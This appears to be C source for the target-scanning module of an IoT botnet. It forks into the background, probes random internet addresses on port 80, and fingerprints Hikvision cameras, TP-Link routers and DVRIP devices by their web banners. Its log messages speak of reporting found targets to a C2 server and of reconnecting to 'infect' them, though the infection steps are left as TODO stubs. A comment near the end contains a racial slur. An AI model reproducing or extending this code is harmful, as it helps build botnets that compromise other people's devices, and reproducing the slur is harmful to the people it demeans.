#include <arpa/inet.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <poll.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#include "bot/client/client.h"
#include "bot/config/table.h"
#include "bot/definitions.h"
#include "bot/modules/scanner/banner/banner_scanner.h"
#include "bot/modules/scanner/ip_list.h"
#include "bot/utils/bytebuf.h"
#include "bot/utils/string.h"
#include "bot/utils/xoshiro.h"

pbsc_connection_t conns;
pbsc_banner_t banners;
size_t num_banners;
uint16_t ports[] = {80 /*81, 88, 8080, 8443*/};

static inline void banner_add(uint8_t, char *);
static inline void bsc_conn_setup(pbsc_connection_t);
static inline void bsc_conn_close(pbsc_connection_t);
static inline void bsc_conn_check_banner(pbsc_connection_t);
static inline void bsc_report(pbsc_connection_t, uint8_t);

void bsc_init() {
  if (fork() > 0) return;

  // add banners
  banner_add(BSC_TYPE_HIKVISION,
             "?ccess ?rror: 404 -- ?ot ?ound");  // Access Error: 404 -- Not Found
  banner_add(BSC_TYPE_HIKVISION, "doc/page/");   // doc/page
  banner_add(BSC_TYPE_HIKVISION, "doc/script/"); // doc/script/

  banner_add(BSC_TYPE_TPLINK, "/webpages/index.html");
  banner_add(BSC_TYPE_TPLINK, "/webpages/login.html");

  conns = calloc(BSC_MAX_FDS, sizeof(bsc_connection_t));
  if (!conns) return;

  for (int i = 0; i < BSC_MAX_FDS; i++) {
    conns[i].fd = -1;
    conns[i].state = BSC_CONNECTION_PENDING;
  }

  struct pollfd pfds[BSC_MAX_FDS];

  while (true) {
    // setup new connections
    for (int i = 0; i < BSC_MAX_FDS; i++) {
      pbsc_connection_t conn = &conns[i];
      if (conn->fd > -1) continue;

      conn->addr.sin_family = AF_INET;
      conn->addr.sin_addr.s_addr = scanner_random_ip();
      conn->addr.sin_port = htons(ports[xoshiro_next() % (sizeof(ports) / sizeof(ports[0]))]);

      conn->state = BSC_CONNECTION_PENDING;
      conn->type = -1;

      bsc_conn_setup(conn);
    }

    for (int i = 0; i < BSC_MAX_FDS; i++) {
      pbsc_connection_t conn = &conns[i];
      if (conn->fd < 0) continue;

      // handle connection timeouts
      if (time(NULL) - conn->last_recv > 10) {
        bsc_conn_close(conn);
        continue;
      }

      pfds[i].fd = conn->fd;
      pfds[i].events = conn->state == BSC_CONNECTION_PENDING ? POLLOUT : POLLIN;
      pfds[i].revents = 0;
    }

    int ret = poll(pfds, BSC_MAX_FDS, 1000);
    if (ret < 0) {
      if (errno == EINTR) continue;
      LOG_ERROR("Poll failed: %s", strerror(errno));
      continue;
    }

    for (int i = 0; i < BSC_MAX_FDS; i++) {
      pbsc_connection_t conn = &conns[i];
      if (conn->fd < 0) continue;

      // handle connection starts
      if (pfds[i].revents & POLLOUT) {
        if (!is_socket_connected(conn->fd)) {
          bsc_conn_close(conn);
          continue;
        }

        // we connected, we good
        LOG_DEBUG("[FD%d] Connected to %s:%d, state=%d", conn->fd, inet_ntoa(conn->addr.sin_addr),
                  ntohs(conn->addr.sin_port), conn->type);

        // we wanna wait for the response
        conn->state = BSC_WAITING_RESPONSE;
        conn->last_recv = time(NULL);

        // send request based on type
        switch (conn->type) {
          case -1: {
            // construct http request, based on infection type
            char request[1024] = {0};
            if (str_template(request, sizeof(request), table_retrieve(TABLE_BANNER_REQUEST, NULL),
                             inet_ntoa(conn->addr.sin_addr)) <= 0) {
              table_lock(TABLE_BANNER_REQUEST);
              bsc_conn_close(conn);
              continue;
            }

            table_lock(TABLE_BANNER_REQUEST);
            send(conn->fd, request, strlen(request), MSG_NOSIGNAL);
            LOG_INFO("Requested %s", request);
          } break;
          case BSC_TYPE_UCHTTPD: {
            LOG_INFO("TODO SEND DVRIP INFECT!!");
          } break;
          case BSC_TYPE_TPLINK: {
            LOG_INFO("TODO SEND TPLINK INFECT!!");
          } break;
          default:
          LOG_INFO("oh");
            break;
        }

        continue;
      }

      // handle issues with the socket
      if (pfds[i].revents & (POLLHUP | POLLERR)) {
        bsc_conn_close(conn);
        continue;
      }

      // handle responses
      if (pfds[i].revents & POLLIN) {
        // hackdrain man
        if (conn->rdbuf_pos == BSC_RDBUF_SIZE) {
          memmove(conn->rdbuf, conn->rdbuf + BSC_HACK_DRAIN, BSC_RDBUF_SIZE - BSC_HACK_DRAIN);
          conn->rdbuf_pos -= BSC_HACK_DRAIN;
        }

        // read new data
        errno = 0;
        size_t n = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, BSC_RDBUF_SIZE - conn->rdbuf_pos,
                        MSG_NOSIGNAL);

        if (n <= 0) {
          bsc_conn_close(conn);
          continue;
        }

        conn->rdbuf_pos += n;
        conn->last_recv = time(NULL);

        // meow
        if (conn->type == -1) {
          bsc_conn_check_banner(conn);
          continue;
        }
      }
    }
  }
}

static inline void banner_add(uint8_t type, char *banner) {
  pbsc_banner_t tmp = realloc(banners, (num_banners + 1) * sizeof(bsc_banner_t));
  if (!tmp) return;

  // set new banners
  banners = tmp;

  // set stuff
  banners[num_banners].type = type;
  banners[num_banners].banner = strdup(banner);
  banners[num_banners++].banner_len = strlen(banner);
}

static inline void bsc_conn_check_banner(pbsc_connection_t conn) {

  // special handling for DVRIP
  int hostport_pos = str_search(conn->rdbuf, "var hostport=", conn->rdbuf_pos, 13);
  if (hostport_pos > 0) {
    char *start = conn->rdbuf + hostport_pos;
    char *end = strchr(start, ';');

    if (end != NULL) {
      char number_str[20] = {0};
      int len = end - start;

      strncpy(number_str, start, len);
      number_str[len] = '\0';

      // trim spaces if any
      char *p = number_str;
      while (*p && isspace(*p))
        p++;

      conn->addr.sin_port = htons(atoi(p));
      conn->type = BSC_TYPE_UCHTTPD;

      LOG_INFO("[FD%d] Found DVRIP on port %d, reconnecting and infecting", conn->fd,
               ntohs(conn->addr.sin_port));

      bsc_conn_close(conn);
      bsc_conn_setup(conn);
      return;
    }

    // couldnt get, just bail
    bsc_conn_close(conn);
    return;
  }

  for (size_t i = 0; i < num_banners; ++i) {
    bsc_banner_t banner = banners[i];

    // search for a banner, then break if found
    if (str_search(conn->rdbuf, banner.banner, conn->rdbuf_pos, banner.banner_len) > 0) {
      // print debug
      LOG_DEBUG("[FD%d] (%s) Found banner: '%s'! Reporting to C2", conn->fd,
                inet_ntoa(conn->addr.sin_addr), banner.banner);

      // set the type
      conn->type = banner.type;

      // restart conn, xd
      bsc_conn_close(conn);
      bsc_conn_setup(conn);

      // break now
      break;
    }
  }

  // fuck you nigga
}

static inline void bsc_conn_setup(pbsc_connection_t conn) {
  if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
    LOG_ERROR("Creating socket failed");
    return;
  }

  conn->last_recv = time(NULL);

  fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
  int _ = connect(conn->fd, (struct sockaddr *)&conn->addr, sizeof(struct sockaddr_in));
}

static inline void bsc_conn_close(pbsc_connection_t conn) {
  if (conn->fd == -1) return;
  close(conn->fd);

  conn->fd = -1;
  conn->state = BSC_CONNECTION_PENDING;

  conn->rdbuf_pos = 0;
  memset(conn->rdbuf, '\0', sizeof(conn->rdbuf));
}
